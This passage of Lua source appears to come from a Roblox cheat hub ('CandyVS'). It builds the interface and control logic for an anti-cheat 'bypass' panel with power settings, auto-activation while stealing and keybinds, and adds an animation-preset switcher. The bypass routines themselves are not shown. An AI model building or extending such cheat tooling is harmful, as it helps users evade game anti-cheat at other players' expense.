	title.TextColor3 = WHITE
	titleShadow.TextColor3 = useWhiteText and WHITE or Color3.fromRGB(20, 50, 100)
	versionButton.TextColor3 = useWhiteText and WHITE or NAVY_TEXT
	toggleButton.TextColor3 = WHITE
	autoLabel.TextColor3 = useWhiteText and WHITE or NAVY_TEXT
	end
	refreshBypassThemeText()

	local isStealing = false
	local listeningForKey = false

	local function setBypassState(enabled, animated)
	enabled = enabled == true
	if bypassRunning == enabled then
	refreshBypassMinimizedToggle()
	return
	end
	if enabled then
	if not startBypass() then return end
	toggleButton.Text = "DEACTIVATE BYPASS"
	toggleButton.TextColor3 = WHITE
	toggleGradient.Color = ColorSequence.new({
	ColorSequenceKeypoint.new(0, Color3.fromRGB(225, 225, 225)),
	ColorSequenceKeypoint.new(1, Color3.fromRGB(195, 195, 195)),
	})
	if animated then
	TweenService:Create(toggleButton, TweenInfo.new(0.2), {
	BackgroundColor3 = Color3.fromRGB(65,65,65)
	}):Play()
	TweenService:Create(toggleStroke, TweenInfo.new(0.2), {
	Color = Color3.fromRGB(235, 235, 235),
	Thickness = 1.8,
	Transparency = 0
	}):Play()
	else
	toggleButton.BackgroundColor3 = Color3.fromRGB(65,65,65)
	toggleStroke.Color = Color3.fromRGB(235, 235, 235)
	toggleStroke.Thickness = 1.8
	end
	else
	stopBypass()
	toggleButton.Text = "ACTIVATE BYPASS"
	toggleButton.TextColor3 = WHITE
	toggleGradient.Color = ColorSequence.new(Color3.fromRGB(96, 96, 96), Color3.fromRGB(68, 68, 68))
	if animated then
	TweenService:Create(toggleButton, TweenInfo.new(0.2), {
	BackgroundColor3 = Color3.fromRGB(22,22,22)
	}):Play()
	TweenService:Create(toggleStroke, TweenInfo.new(0.2), {
			Color = Color3.fromRGB(0, 0, 0),
	Thickness = 1.2,
	Transparency = 0
	}):Play()
	else
	toggleButton.BackgroundColor3 = Color3.fromRGB(22,22,22)
			toggleStroke.Color = Color3.fromRGB(0, 0, 0)
	toggleStroke.Thickness = 1.2
	end
	end
	toggleScale.Scale = 0.94
	TweenService:Create(toggleScale, TweenInfo.new(0.15, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
	Scale = 1
	}):Play()
	refreshBypassMinimizedToggle()
	saveSettings()
	end

	local function setAutoVisual(animated)
	local pillColor = autoState and Color3.fromRGB(205,205,205) or Color3.fromRGB(20,20,20)
	local knobPos = autoState and UDim2.new(0,16,0.5,-5) or UDim2.new(0,2,0.5,-5)
	local strokeColor = autoState and Color3.fromRGB(235, 235, 235) or Color3.fromRGB(55, 55, 55)
	local strokeThickness = autoState and 1.6 or 1.2
	if animated then
	TweenService:Create(autoPill, TweenInfo.new(0.2), {BackgroundColor3 = pillColor}):Play()
	TweenService:Create(autoKnob, TweenInfo.new(0.2), {Position = knobPos, BackgroundColor3 = autoState and Color3.fromRGB(45,45,45) or Color3.fromRGB(60,60,60)}):Play()
	TweenService:Create(autoPillStroke, TweenInfo.new(0.2), {Color = strokeColor, Thickness = strokeThickness}):Play()
	else
	autoPill.BackgroundColor3 = pillColor
	autoKnob.Position = knobPos
	autoKnob.BackgroundColor3 = autoState and Color3.fromRGB(45,45,45) or Color3.fromRGB(60,60,60)
	autoPillStroke.Color = strokeColor
	autoPillStroke.Thickness = strokeThickness
	end
	end

	local function getCurrentStealingState()
	if not player then return false end
	return player:GetAttribute("Stealing") == true
	end

	local function syncAutoOnSteal(animated)
	local realSteal = getCurrentStealingState()
	isStealing = realSteal
	if autoState and not manualOverride and realSteal ~= bypassRunning then
	setBypassState(realSteal, animated)
	end
	end

	_G.__CandyVSTrackConn(player:GetAttributeChangedSignal("Stealing"):Connect(function()
	local currentSteal = player:GetAttribute("Stealing") == true
	if currentSteal then
	manualOverride = false
	end
	syncAutoOnSteal(true)
	end))

	task.spawn(function()
	while screenGui.Parent do
	syncAutoOnSteal(false)
	task.wait(1)
	end
	end)

	local GAMEPAD_TYPES = {
	[Enum.UserInputType.Gamepad1] = true,
	[Enum.UserInputType.Gamepad2] = true,
	[Enum.UserInputType.Gamepad3] = true,
	[Enum.UserInputType.Gamepad4] = true,
	}

	local function isValidBindInput(input)
	local t = input.UserInputType
	return t == Enum.UserInputType.Keyboard or t == Enum.UserInputType.MouseButton3 or GAMEPAD_TYPES[t] == true
	end

	local function getBindName(input)
	if input.UserInputType == Enum.UserInputType.MouseButton3 then return "Mouse3" end
	local labels = {
	Zero = "0", One = "1", Two = "2", Three = "3", Four = "4",
	Five = "5", Six = "6", Seven = "7", Eight = "8", Nine = "9",
	}
	return labels[input.KeyCode.Name] or input.KeyCode.Name
	end

	local function setListening(state)
	listeningForKey = state
	keybindButton.Text = state and "..." or (boundInput and getBindName({UserInputType = boundInput.inputType, KeyCode = boundInput.keyCode}) or "None")
	end

	keybindButton.Activated:Connect(function() setListening(true) end)

	local function toggleManual()
	manualOverride = true
	setBypassState(not bypassRunning, true)
	saveSettings()
	end

	toggleButton.Activated:Connect(function() toggleManual() end)
	bypassMinimizedToggle.Activated:Connect(function() toggleManual() end)

	toggleButton.MouseEnter:Connect(function()
	if not bypassRunning then
	TweenService:Create(toggleButton, TweenInfo.new(0.1), {
	BackgroundColor3 = Color3.fromRGB(35,35,35)
	}):Play()
	end
	end)

	toggleButton.MouseLeave:Connect(function()
	if not bypassRunning then
	TweenService:Create(toggleButton, TweenInfo.new(0.1), {
	BackgroundColor3 = Color3.fromRGB(22,22,22)
	}):Play()
	end
	end)

	_G.__CandyVSTrackConn(UserInputService.InputBegan:Connect(function(input, gameProcessed)
	if listeningForKey then
	if input.UserInputType == Enum.UserInputType.MouseButton1 then
	setListening(false)
	return
	end
	if isValidBindInput(input) then
	boundInput = {inputType = input.UserInputType, keyCode = input.KeyCode}
	keybindButton.Text = getBindName(input)
	listeningForKey = false
	saveSettings()
	end
	return
	end
	if gameProcessed then return end
	if boundInput and input.UserInputType == boundInput.inputType and input.KeyCode == boundInput.keyCode then toggleManual() end
	end))

	autoPill.Activated:Connect(function()
	autoState = not autoState
	_G["_CandyVSHub_BypassAuto"] = autoState
	setAutoVisual(true)
	if autoState then
	manualOverride = false
	syncAutoOnSteal(true)
	end
	saveSettings()
	end)

	local dragging, dragStart, dragStartPosition, dragInput = false, nil, nil, nil
	local function isInsideHeader(position)
	local framePosition = mainFrame.AbsolutePosition
	local frameSize = mainFrame.AbsoluteSize
	return position.X >= framePosition.X
	and position.X <= framePosition.X + frameSize.X
	and position.Y >= framePosition.Y
	and position.Y <= framePosition.Y + 48
	end
	_G.__CandyVSTrackConn(UserInputService.InputBegan:Connect(function(input)
	if input.UserInputType ~= Enum.UserInputType.MouseButton1 and input.UserInputType ~= Enum.UserInputType.Touch then return end
	if not mainFrame.Visible or not isInsideHeader(input.Position) then return end
	dragging = true
	dragStart = input.Position
	dragStartPosition = mainFrame.AbsolutePosition
	dragInput = input
	end))
	_G.__CandyVSTrackConn(UserInputService.InputChanged:Connect((function(input)
	if not dragging then return end
	if input.UserInputType ~= Enum.UserInputType.MouseMovement and input.UserInputType ~= Enum.UserInputType.Touch then return end
	local delta = input.Position - dragStart
	local newX = dragStartPosition.X + delta.X
	local newY = dragStartPosition.Y + delta.Y
	mainFrame.Position = UDim2.new(0,newX,0,newY)
	end)))
	_G.__CandyVSTrackConn(UserInputService.InputEnded:Connect(function(input)
	local mouseReleased = dragInput and dragInput.UserInputType == Enum.UserInputType.MouseButton1 and input.UserInputType == Enum.UserInputType.MouseButton1
	if not dragging or (input ~= dragInput and not mouseReleased) then return end
	dragging = false
	dragInput = nil
	saveSettings()
	end))

	for _, descendant in ipairs(screenGui:GetDescendants()) do
	if descendant:IsA("TextLabel") or descendant:IsA("TextButton") or descendant:IsA("TextBox") then
	descendant:SetAttribute("CandyVSKeepBlackText", true)
	descendant.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
	descendant.TextStrokeTransparency = 0.2
	end
	end
	if refreshBypassThemeText then refreshBypassThemeText() end

	local savedData = loadSettings()
	if savedData then
	if savedData.visible ~= nil then
	mainFrame.Visible = savedData.visible
	end
	if savedData.bypassVersion then BypassConfig.Version = savedData.bypassVersion; updateVersionButton() else BypassConfig.Version = "V1"; updateVersionButton() end
	BypassConfig.Mode = savedData.mode == "Mobile" and "Mobile" or "PC"
	local legacyPower = tonumber(savedData.power)
	BypassConfig.PCPower = math.clamp(tonumber(savedData.pcPower) or (BypassConfig.Mode == "PC" and legacyPower) or 97000, 10000, 150000)
	BypassConfig.MobilePower = math.clamp(tonumber(savedData.mobilePower) or (BypassConfig.Mode == "Mobile" and legacyPower) or 72000, 10000, 150000)
	BypassConfig.Power = BypassConfig.Mode == "PC" and BypassConfig.PCPower or BypassConfig.MobilePower
	powerBox.Text = tostring(BypassConfig.Power)
	updateModeVisuals()
	if savedData.autoOnSteal ~= nil then
	autoState = savedData.autoOnSteal == true
	_G["_CandyVSHub_BypassAuto"] = autoState
	setAutoVisual(false)
	end
	if savedData.keybind and savedData.keybind.inputType and savedData.keybind.keyCode then
	pcall(function()
	local it = Enum.UserInputType[savedData.keybind.inputType]
	local kc = Enum.KeyCode[savedData.keybind.keyCode]
	if it and kc then
	boundInput = {inputType = it, keyCode = kc}
	keybindButton.Text = getBindName({UserInputType = it, KeyCode = kc})
	end
	end)
	end
	if savedData.background then
	currentPage = math.clamp(savedData.background, 1, #BACKGROUNDS)
	bgImage.Image = BACKGROUNDS[currentPage]
	_G.__CandyVSFramePanelBackground(bgImage, currentPage, "Bypass")
	mainStroke.Transparency = currentPage == 1 and 1 or 0.448
	glow.Transparency = currentPage == 1 and 1 or 0.782
	glow2.Transparency = currentPage == 1 and 1 or 0.891
	end
	if refreshBypassThemeText then refreshBypassThemeText() end
	if savedData.position and not _G.__CandyVSGuiPositionsReset then
	pcall(function()
	mainFrame.Position = UDim2.new(savedData.position.xScale, savedData.position.xOffset, savedData.position.yScale, savedData.position.yOffset)
	end)
	end
	applyBypassMinimized(savedData.minimized == true, false)
	if savedData.manualOverride ~= nil then manualOverride = savedData.manualOverride end
	if autoState then
	syncAutoOnSteal(false)
	end
	else
	BypassConfig.Version = "V1"
	BypassConfig.Mode = "PC"
	BypassConfig.PCPower = 97000
	BypassConfig.MobilePower = 72000
	BypassConfig.Power = 97000
	powerBox.Text = "97000"
	versionButton.Text = "V1"
	updateVersionButton()
	updateModeVisuals()
	saveSettings()
	end
	currentPage = 1
	bgImage.Image = BACKGROUNDS[currentPage]
	_G.__CandyVSFramePanelBackground(bgImage, currentPage, "Bypass")
	mainStroke.Transparency = currentPage == 1 and 1 or 0.448
	glow.Transparency = currentPage == 1 and 1 or 0.782
	glow2.Transparency = currentPage == 1 and 1 or 0.891
	if refreshBypassThemeText then refreshBypassThemeText() end
	saveSettings()


	local dragSaveGeneration = 0
	mainFrame:GetPropertyChangedSignal("Position"):Connect(function()
	if themesFrame.Visible then positionThemesPanel() end
	dragSaveGeneration = dragSaveGeneration + 1
	local thisGeneration = dragSaveGeneration
	task.delay(0.4, function()
	if thisGeneration == dragSaveGeneration then saveSettings() end
	end)
	end)

	_G.CandyVSBypass = {
	ResetPosition = function()
	dragging = false
	dragInput = nil
	mainFrame.Position = UDim2.new(0.5, -bypassWidth / 2, 0.5, -bypassHeight / 2)
	saveSettings()
	end,
	GetPower = function() return BypassConfig.Power end,
	GetKeybind = function() return boundInput end,
	IsEnabled = function() return bypassRunning end,
	IsAutoOnSteal = function() return autoState end,
	IsStealing = function() return isStealing end,
	PauseForDrop = function()
	if BypassConfig.DropPaused then return true end
	BypassConfig.DropPaused = bypassRunning == true
	if BypassConfig.DropPaused then stopBypass(true) end
	return BypassConfig.DropPaused
	end,
	ResumeAfterDrop = function()
	if not BypassConfig.DropPaused then return false end
	BypassConfig.DropPaused = false
	return startBypass()
	end,
	GetBackground = function() return currentPage end,
	GetVersion = function() return BypassConfig.Version end,
	GetMode = function() return BypassConfig.Mode end,
	GetPosition = function() return {x = mainFrame.Position.X.Offset, y = mainFrame.Position.Y.Offset} end,
	SetBackground = function(page)
	page = math.clamp(page, 1, #BACKGROUNDS)
	currentPage = page
	bgImage.Image = BACKGROUNDS[currentPage]
	_G.__CandyVSFramePanelBackground(bgImage, currentPage, "Bypass")
	mainStroke.Transparency = currentPage == 1 and 1 or 0.448
	glow.Transparency = currentPage == 1 and 1 or 0.782
	glow2.Transparency = currentPage == 1 and 1 or 0.891
	if refreshBypassThemeText then refreshBypassThemeText() end
	saveSettings()
	end,
	SetBypass = function(enabled)
	manualOverride = true
	setBypassState(enabled, true)
	saveSettings()
	end,
	SetPower = function(power)
	local maximum = BypassConfig.Mode == "PC" and 150000 or 100000
	local clamped = math.clamp(power, 10000, maximum)
	powerBox.Text = tostring(clamped)
	updateBypassPower(clamped)
	saveSettings()
	end,
	SetMode = function(mode)
	selectMode(mode)
	end,
	SetAutoOnSteal = function(enabled)
	autoState = enabled == true
	_G["_CandyVSHub_BypassAuto"] = autoState
	setAutoVisual(true)
	if autoState then
	manualOverride = false
	syncAutoOnSteal(true)
	end
	saveSettings()
	end,
	SetVisible = function(visible)
	if mainFrame then
	local isVisible = visible and true or false
	mainFrame.Visible = isVisible
	bypassToggled = isVisible
	updateBypassVisual()
	if not isVisible and themesFrame then themesFrame.Visible = false end
	saveSettings()
	end
	end,
	SetVersion = function(version)
	if version ~= "V1" and version ~= "V2" then return end
	switchBypassVersion(version)
	updateVersionButton()
	saveSettings()
	end,
	SetPosition = function(x, y)
	pcall(function()
	mainFrame.Position = UDim2.new(mainFrame.Position.X.Scale, x, mainFrame.Position.Y.Scale, y)
	saveSettings()
	end)
	end,
	Stop = function()
	stopBypass()
	end,
	}
	if not candyvsRuntimeState.alive then
	stopBypass()
	pcall(function() screenGui:Destroy() end)
	return
	end
	_G.__CandyVSTrackStopper(function()
	stopBypass()
	pcall(function() if screenGui and screenGui.Parent then screenGui:Destroy() end end)
	_G.CandyVSBypass = nil
	_G._CandyVSBypassGUILoaded = false
	end)
	_G.__setBypassAuto = function(on)
	pcall(function()
	autoState = on and true or false
	_G["_CandyVSHub_BypassAuto"] = autoState
	setAutoVisual(true)
	saveSettings()
	if autoState then
	manualOverride = false
	syncAutoOnSteal(true)
	end
	end)
	end
	pcall(function()
	if openPanel and mainFrame and not mainFrame.Visible then
	mainFrame.Visible = true
	saveSettings()
	end
	end)
	end)
	end)
	end
	_G.__openBypassGUI = openBypassGUI

	local function toggleBypassPanel()
	bypassToggled = not bypassToggled
	updateBypassVisual()

	if bypassToggled then
	if _G._CandyVSBypassGUILoaded then
	if _G.CandyVSBypass and _G.CandyVSBypass.SetVisible then
	_G.CandyVSBypass.SetVisible(true)
	end
	if _G.CandyVSBypass and _G.CandyVSBypass.SaveSettings then
	_G.CandyVSBypass.SaveSettings()
	end
	else
	openBypassGUI(true)
	end
	else
	if _G.CandyVSBypass and _G.CandyVSBypass.SetVisible then
	_G.CandyVSBypass.SetVisible(false)
	end
	if _G.CandyVSBypass and _G.CandyVSBypass.SaveSettings then
	_G.CandyVSBypass.SaveSettings()
	end
	end
	if _G.CandyVSBypass and _G.CandyVSBypass.SetVisible then
	_G.CandyVSBypass.SetVisible(bypassToggled)
	end
	end
	bypassBtn.Activated:Connect(function()
	pcall(function()
	if _G.CandyVSBypass and _G.CandyVSBypass.SetBypass and _G.CandyVSBypass.IsEnabled then
	local cur = _G.CandyVSBypass.IsEnabled() == true
	_G.CandyVSBypass.SetBypass(not cur)
	if _G.__syncBypassVisual then pcall(_G.__syncBypassVisual) end
	end
	end)
	toggleBypassPanel()
	end)

	updateBypassVisual()

	do
	local bypassHasSavedState, bypassSavedVisible = _G.__CandyVSReadSavedPanelVisibility("CandyVSBypass_Settings.json")
	bypassToggled = bypassHasSavedState and bypassSavedVisible or false
	updateBypassVisual()
	if bypassHasSavedState then openBypassGUI(false) end
	end
	_G.__CandyVSReadSavedPanelVisibility = nil


	local toggleUiRow = Instance.new("Frame", panelsPanel)
	toggleUiRow.Size = UDim2.new(1, -18, 0, 28)
	toggleUiRow.Position = UDim2.new(0, 9, 0, 68)
	toggleUiRow.BackgroundTransparency = 1
	toggleUiRow.Visible = true
	local toggleUiLabel = Instance.new("TextLabel", toggleUiRow)
	toggleUiLabel.Size = UDim2.new(1, -50, 0, 32)
	toggleUiLabel.Position = UDim2.new(0, 0, 0, 2)
	toggleUiLabel.BackgroundTransparency = 1
	toggleUiLabel.Text = "Toggle UI"
	toggleUiLabel.TextColor3 = Color3.fromRGB(40, 80, 150)
	toggleUiLabel.TextSize = 10
	toggleUiLabel.Font = Enum.Font.FredokaOne
	toggleUiLabel.TextXAlignment = Enum.TextXAlignment.Left
	toggleUiLabel.TextYAlignment = Enum.TextYAlignment.Center

	local toggleUiBindBtn = Instance.new("TextButton", toggleUiRow)
	toggleUiBindBtn.Size = UDim2.new(0, 40, 0, 20)
	toggleUiBindBtn.Position = UDim2.new(1, -48, 0.5, -10)
	toggleUiBindBtn.BackgroundColor3 = Color3.fromRGB(30,30,38)
	toggleUiBindBtn.BackgroundTransparency = 0.15
	toggleUiBindBtn.BorderSizePixel = 0
	toggleUiBindBtn.Text = FeatureKeybinds["Toggle UI"] and keybindDisplayName(FeatureKeybinds["Toggle UI"]) or "-"
	toggleUiBindBtn.TextColor3 = Color3.fromRGB(225,238,255)
	toggleUiBindBtn.TextSize = 9
	toggleUiBindBtn.Font = Enum.Font.FredokaOne
	toggleUiBindBtn.AutoButtonColor = false
	Instance.new("UICorner", toggleUiBindBtn).CornerRadius = UDim.new(0, 4)
	local toggleUiStroke = Instance.new("UIStroke", toggleUiBindBtn)
	toggleUiStroke.Color = Color3.fromRGB(255,255,255)
	toggleUiStroke.Thickness = 1
	toggleUiStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border

	connectBtn(toggleUiBindBtn, function()
	if listeningBindBtn then
	listeningBindBtn.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
	listeningBindBtn.BackgroundTransparency = 1
	listeningBindBtn.Text = "-"
	end
	listeningBindBtn = toggleUiBindBtn
	listeningFeature = "Toggle UI"
	toggleUiBindBtn.Text = "..."
	toggleUiBindBtn.BackgroundColor3 = Color3.fromRGB(4, 18, 42)
	toggleUiBindBtn.BackgroundTransparency = 0
	end)

	table.insert(_allBindBtns, toggleUiBindBtn)
	if toggleVisualUpdaters["Toggle UI"] == nil then
	toggleVisualUpdaters["Toggle UI"] = function()
	toggleUiBindBtn.Text = FeatureKeybinds["Toggle UI"] and keybindDisplayName(FeatureKeybinds["Toggle UI"]) or "-"
	toggleUiBindBtn.BackgroundColor3 = Color3.fromRGB(30,30,38)
	toggleUiBindBtn.BackgroundTransparency = 0.15
	toggleUiBindBtn.TextColor3 = Color3.fromRGB(225,238,255)
	end
	end

	end 

	local animationsSection = makeUraniumSection(tabPages["Animations"], "ANIMATIONS")
	local animationPresetOrder = {
	"Adidas Sports",
	"Adidas Community",
	"Adidas Aura",
	"Wicked Popular",
	"Elder",
	"Zombie",
	"Mage",
	"Catwalk Glam",
	"Astronaut",
	'Wicked "Dancing Through Life"',
	"Werewolf",
	"Superhero",
	"Toy",
	"No Boundaries",
	"NFL",
	"Amazon Unboxed",
	"Vampire",
	"Ninja",
	"Robot",
	"Levitation",
	"Stylish",
	"Bubbly",
	"Cartoon",
	}
	local animationPresets = {
	["Adidas Sports"]               = {WalkAnim=18537392113, RunAnim=18537384940, JumpAnim=18537380791, FallAnim=18537367238, SwimIdle=18537387180, Swim=18537389531, Animation1=18537376492, Animation2=18537371272, ClimbAnim=18537363391},
	["Adidas Community"]            = {WalkAnim=122150855457006, RunAnim=82598234841035, JumpAnim=75290611992385, FallAnim=98600215928904, SwimIdle=109346520324160, Swim=133308483266208, Animation1=122257458498464, Animation2=102357151005774, ClimbAnim=88763136693023},
	["Adidas Aura"]                 = {WalkAnim=83842218823011, RunAnim=118320322718866, JumpAnim=109996626521204, FallAnim=95603166884636, SwimIdle=94922130551805, Swim=134530128383903, Animation1=110211186840347, Animation2=114191137265065, ClimbAnim=97824616490448},
	["Wicked Popular"]              = {WalkAnim=92072849924640, RunAnim=72301599441680, JumpAnim=104325245285198, FallAnim=121152442762481, Animation1=118832222982049, ClimbAnim=131326830509784, SwimIdle=113199415118199, Swim=99384245425157, Animation2=76049494037641},
	["Elder"]                       = {WalkAnim=10921111375, RunAnim=10921104374, JumpAnim=10921107367, FallAnim=10921105765, SwimIdle=10921110146, Swim=10921108971, ClimbAnim=10921100400, Animation1=10921101664, Animation2=10921102574},
	["Zombie"]                      = {WalkAnim=10921355261, RunAnim=616163682, JumpAnim=10921351278, FallAnim=10921350320, SwimIdle=10921353442, Swim=10921352344, Animation1=10921344533, Animation2=10921345304, ClimbAnim=10921343576},
	["Mage"]                        = {WalkAnim=10921152678, RunAnim=10921148209, JumpAnim=10921149743, FallAnim=10921148939, SwimIdle=10921151661, Swim=10921150788, ClimbAnim=10921143404, Animation1=10921144709, Animation2=10921145797},
	["Catwalk Glam"]                = {WalkAnim=109168724482748, RunAnim=81024476153754, JumpAnim=116936326516985, FallAnim=92294537340807, SwimIdle=98854111361360, Swim=134591743181628, ClimbAnim=119377220967554, Animation1=133806214992291, Animation2=94970088341563},
	["Astronaut"]                   = {WalkAnim=10921046031, RunAnim=10921039308, JumpAnim=10921042494, FallAnim=10921040576, SwimIdle=10921045006, Swim=10921044000, ClimbAnim=10921032124, Animation1=10921034824, Animation2=10921036806},
	["Wicked \"Dancing Through Life\""] = {WalkAnim=73718308412641, RunAnim=135515454877967, JumpAnim=78508480717326, FallAnim=78147885297412, SwimIdle=129183123083281, Swim=110657013921774, ClimbAnim=129447497744818, Animation1=92849173543269, Animation2=132238900951109},
	["Werewolf"]                    = {WalkAnim=10921342074, RunAnim=10921336997, FallAnim=10921337907, SwimIdle=10921341319, Swim=10921340419, ClimbAnim=10921329322, Animation1=10921330408, Animation2=10921333667},
	["Superhero"]                   = {WalkAnim=10921298616, RunAnim=10921291831, JumpAnim=10921294559, FallAnim=10921293373, SwimIdle=10921297391, Swim=10921295495, ClimbAnim=10921286911, Animation1=10921288909, Animation2=10921290167},
	["Toy"]                         = {WalkAnim=10921312010, RunAnim=10921306285, JumpAnim=10921308158, FallAnim=10921307241, SwimIdle=10921310341, Swim=10921309319, ClimbAnim=10921300839, Animation1=10921301576},
	["No Boundaries"]               = {WalkAnim=18747074203, RunAnim=18747070484, JumpAnim=18747069148, FallAnim=18747062535, SwimIdle=18747071682, Swim=18747073181, ClimbAnim=18747060903, Animation1=18747067405, Animation2=18747063918},
	["NFL"]                         = {WalkAnim=110358958299415, RunAnim=117333533048078, JumpAnim=119846112151352, FallAnim=129773241321032, SwimIdle=79090109939093, Swim=132697394189921, ClimbAnim=134630013742019, Animation1=92080889861410, Animation2=74451233229259},
	["Amazon Unboxed"]              = {WalkAnim=90478085024465, RunAnim=134824450619865, JumpAnim=121454505477205, FallAnim=94788218468396, SwimIdle=129126268464847, Swim=105962919001086, ClimbAnim=121145883950231, Animation1=98281136301627},
	["Vampire"]                     = {WalkAnim=10921326949, RunAnim=10921320299, JumpAnim=10921322186, FallAnim=10921321317, SwimIdle=10921325443, Swim=10921324408, ClimbAnim=10921314188, Animation1=10921315373},
	["Ninja"]                       = {RunAnim=656118852, WalkAnim=656121766, JumpAnim=656117878, FallAnim=656115606, Swim=656119721, SwimIdle=656121397, ClimbAnim=656114359, Idle={656117400,656118341,886742569}},
	["Robot"]                       = {RunAnim=616091570, WalkAnim=616095330, JumpAnim=616090535, FallAnim=616087089, Swim=616092998, SwimIdle=616094091, ClimbAnim=616086039, Idle={616088211,616089559,885531463}},
	["Levitation"]                  = {RunAnim=616010382, WalkAnim=616013216, JumpAnim=616008936, FallAnim=616005863, Swim=616011509, SwimIdle=616012453, ClimbAnim=616003713, Idle={616006778,616008087,886862142}},
	["Stylish"]                     = {RunAnim=616140816, WalkAnim=616146177, JumpAnim=616139451, FallAnim=616134815, Swim=616143378, SwimIdle=616144772, ClimbAnim=616133594, Idle={616136790,616138447,886888594}},
	["Bubbly"]                      = {RunAnim=910025107, WalkAnim=910034870, JumpAnim=910016857, FallAnim=910001910, Swim=910028158, SwimIdle=910030921, ClimbAnim=909997997, Idle={910004836,910009958,1018536639}},
	["Cartoon"]                     = {RunAnim=742638842, WalkAnim=742640026, JumpAnim=742637942, FallAnim=742637151, Swim=742639220, SwimIdle=742639812, ClimbAnim=742636889, Idle={742637544,742638445,885477856}},
	}
	local animationPropertyOrder = {"idle1", "idle2", "walk", "run", "jump", "fall", "climb", "swim", "swimidle"}
	local animationPropertyLabels = {
	idle1 = "Idle 1",
	idle2 = "Idle 2",
	walk = "Walk",
	run = "Run",
	jump = "Jump",
	fall = "Fall",
	climb = "Climb",
	swim = "Swim",
	swimidle = "Swim Idle",
	}
	local function normalizeAnimValue(value)
	if not value then return nil end
	if type(value) == "number" then
	return "rbxassetid://" .. tostring(value)
	end
	if type(value) == "string" then
	local trimmed = string.gsub(value, "^%s+", "")
	trimmed = string.gsub(trimmed, "%s+$", "")
	if trimmed == "" then return nil end
	if string.sub(trimmed, 1, 11) == "rbxassetid://" then return trimmed end
	if string.match(trimmed, "^%d+$") then return "rbxassetid://" .. trimmed end
	return trimmed
	end
	return nil
	end
	local function buildAnimPackFromPreset(preset)
	local idle = preset and preset.Idle
	return {
	idle1 = normalizeAnimValue(preset and (preset.Animation1 or (idle and idle[1]))),
	idle2 = normalizeAnimValue(preset and (preset.Animation2 or (idle and idle[2]))),
	walk = normalizeAnimValue(preset and (preset.WalkAnim or preset.Walk)),
	run = normalizeAnimValue(preset and (preset.RunAnim or preset.Run)),
	jump = normalizeAnimValue(preset and (preset.JumpAnim or preset.Jump)),
	fall = normalizeAnimValue(preset and (preset.FallAnim or preset.Fall)),
	climb = normalizeAnimValue(preset and (preset.ClimbAnim or preset.Climb)),
	swim = normalizeAnimValue(preset and (preset.Swim or preset.SwimAnim)),
	swimidle = normalizeAnimValue(preset and (preset.SwimIdle or preset.SwimIdleAnim)),
	}
	end
	local animationFieldRefs = {}
	local Anims = {
	idle1    = "rbxassetid://133806214992291",
	idle2    = "rbxassetid://94970088341563",
	walk     = "rbxassetid://707897309",
	run      = "rbxassetid://707861613",
	jump     = "rbxassetid://116936326516985",
	fall     = "rbxassetid://116936326516985",
	climb    = "rbxassetid://116936326516985",
	swim     = "rbxassetid://116936326516985",
	swimidle = "rbxassetid://116936326516985",
	}
	_G.__CandyVSHub_Anims = Anims
	local animIdToName = {}
	local animNameToId = {}
	for presetName, preset in pairs(animationPresets) do
	local pack = buildAnimPackFromPreset(preset)
	for _, key in ipairs(animationPropertyOrder) do
	local id = pack[key]
	if id then
	local nm = presetName .. " " .. animationPropertyLabels[key]
	if not animNameToId[nm] then
	animNameToId[nm] = id
	animIdToName[id] = nm
	end
	end
	end
	end
	local function animDisplayName(id)
	if not id then return "" end
	if id == "rbxassetid://" then return "Custom" end
	return animIdToName[id] or id
	end
	local slotAnimationList = {}
	for _, key in ipairs(animationPropertyOrder) do slotAnimationList[key] = {} end
	for _, presetName in ipairs(animationPresetOrder) do
	local preset = animationPresets[presetName]
	if preset then
	local pack = buildAnimPackFromPreset(preset)
	for _, key in ipairs(animationPropertyOrder) do
	local id = pack[key]
	if id and not table.find(slotAnimationList[key], id) then
	table.insert(slotAnimationList[key], id)
	end
	end
	end
	end
	local function cycleSlotAnimation(key, box)
	local list = slotAnimationList[key]
	if not list or not box then return end
	local currentId = Anims[key]
	local nextIndex = 1
	for i, id in ipairs(list) do
	if id == currentId then
	nextIndex = i % #list + 1
	break
	end
	end
	Anims[key] = list[nextIndex]
	box.Text = animDisplayName(list[nextIndex])
	saveConfig()
	if toggleStates["Harder Hit Anim"] and saveOriginalAnims then
	local char = Player.Character
	if char then
	saveOriginalAnims(char)
	applyAnimPack(char)
	end
	end
	end
	local selectedAnimationPresetName = animationPresetOrder[1]
	local function applyAnimationPreset(name)
	local preset = animationPresets[name]
	if not preset then return end
	local pack = buildAnimPackFromPreset(preset)
	selectedAnimationPresetName = name
	Anims.idle1 = pack.idle1 or Anims.idle1
	Anims.idle2 = pack.idle2 or Anims.idle2
	Anims.walk = pack.walk or Anims.walk
	Anims.run = pack.run or Anims.run
	Anims.jump = pack.jump or Anims.jump
	Anims.fall = pack.fall or Anims.fall
	Anims.climb = pack.climb or Anims.climb
	Anims.swim = pack.swim or Anims.swim
	Anims.swimidle = pack.swimidle or Anims.swimidle
	if toggleStates["Harder Hit Anim"] and saveOriginalAnims and applyAnimPack then
	local char = Player.Character
	if char then
	saveOriginalAnims(char)
	applyAnimPack(char)
	end
	end
	end
	local function loadAnimationPresetIntoFields(name)
	local preset = animationPresets[name]
	if not preset then return end
	local pack = buildAnimPackFromPreset(preset)
	for _, key in ipairs(animationPropertyOrder) do
	local box = animationFieldRefs[key]
	if box then
	local value = pack[key] or ""
	box.Text = animDisplayName(value)
	end
	end
	applyAnimationPreset(name)
	end
	makeToggleNoKeybind(animationsSection, "Animaciones (Master)", "Animaciones")
	FeaturePostToggle["Animaciones"] = function(active)
	if toggleStates["Harder Hit Anim"] == active then return end
	toggleStates["Harder Hit Anim"] = active
	if FeaturePostToggle["Harder Hit Anim"] then FeaturePostToggle["Harder Hit Anim"](active) end
	if toggleVisualUpdaters["Harder Hit Anim"] then toggleVisualUpdaters["Harder Hit Anim"]() end
	saveConfig()
	end

	local presetButton = Instance.new("TextButton", animationsSection)
	presetButton.Size = UDim2.new(1, 0, 0, 34)
	presetButton.BackgroundColor3 = Color3.fromRGB(22, 22, 28)
	presetButton.BorderSizePixel = 0
	presetButton.Text = "Preset: " .. selectedAnimationPresetName
	presetButton.TextColor3 = Color3.fromRGB(255, 255, 255)
	presetButton.TextSize = 11
	presetButton.Font = Enum.Font.FredokaOne
